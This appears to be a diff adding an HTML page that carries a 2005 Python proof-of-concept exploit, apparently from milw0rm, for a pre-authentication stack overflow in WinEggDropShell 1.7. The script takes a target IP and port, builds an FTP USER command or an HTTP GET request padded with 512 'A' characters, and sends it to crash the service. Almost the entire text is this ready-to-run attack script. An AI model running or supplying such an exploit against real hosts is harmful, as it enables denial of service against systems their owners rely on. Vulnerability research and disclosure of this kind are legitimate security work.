@@ -1,0 +1,51 @@
+<html>
+<head>
+<title>WinEggDropShell 1.7 Multiple PreAuth Remote Stack Overflow PoC</title>
+<pre>
+# WinEggDropShell Multipe PreAuth Remote Stack Overflow PoC
+# HTTP Server &quot;GET&quot;  &amp;&amp; FTP Server &quot;USER&quot; &quot;PASS&quot; command
+# Bug Discoverd and coded by Sowhat
+# Greetingz to killer,baozi,Darkeagle,all 0x557 and XFocus guys....;)
+# http://secway.org
+# 2005-10-11
+
+# Affected:
+# WinEggDropShell Eterntiy version
+# Other version may be vulnerable toooooo
+
+import sys
+import string
+import socket
+
+if (len(sys.argv) != 4):
+	
+	print &quot;##########################################################################&quot;
+	print &quot;#      WinEggDropShell Multipe PreAuth Remote Stack Overflow PoC         #&quot;
+	print &quot;#          This Poc will BOD the vulnerable target                       #&quot;
+	print &quot;#          Bug Discoverd and coded  by Sowhat                            #&quot;
+	print &quot;#                 http://secway.org                                      #&quot;
+	print &quot;##########################################################################&quot;
+	print &quot;\nUsage: &quot; + sys.argv[0] + &quot;HTTP/FTP&quot; + &quot; TargetIP&quot; + &quot; Port\n&quot;
+	print &quot;Example: \n&quot; + sys.argv[0] + &quot; HTTP&quot; + &quot; 1.1.1.1&quot; + &quot; 80&quot; 
+	print sys.argv[0] + &quot; FTP&quot; + &quot; 1.1.1.1&quot; + &quot; 21&quot; 
+	sys.exit(0)
+
+host = sys.argv[2]
+port = string.atoi(sys.argv[3])
+
+if ((sys.argv[1] == &quot;FTP&quot;) | (sys.argv[1] == &quot;ftp&quot;)):
+
+		request = &quot;USER &quot; + 'A'*512 + &quot;\r&quot;
+
+if ((sys.argv[1] == &quot;HTTP&quot;) | (sys.argv[1] == &quot;http&quot;)):
+
+		request = &quot;GET /&quot; + 'A'*512 + &quot; HTTP/1.1 \r\n&quot; 
+
+exp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+exp.connect((host,port))
+exp.send(request)
+
+# milw0rm.com [2005-12-02]
+</pre>
+</html>
+
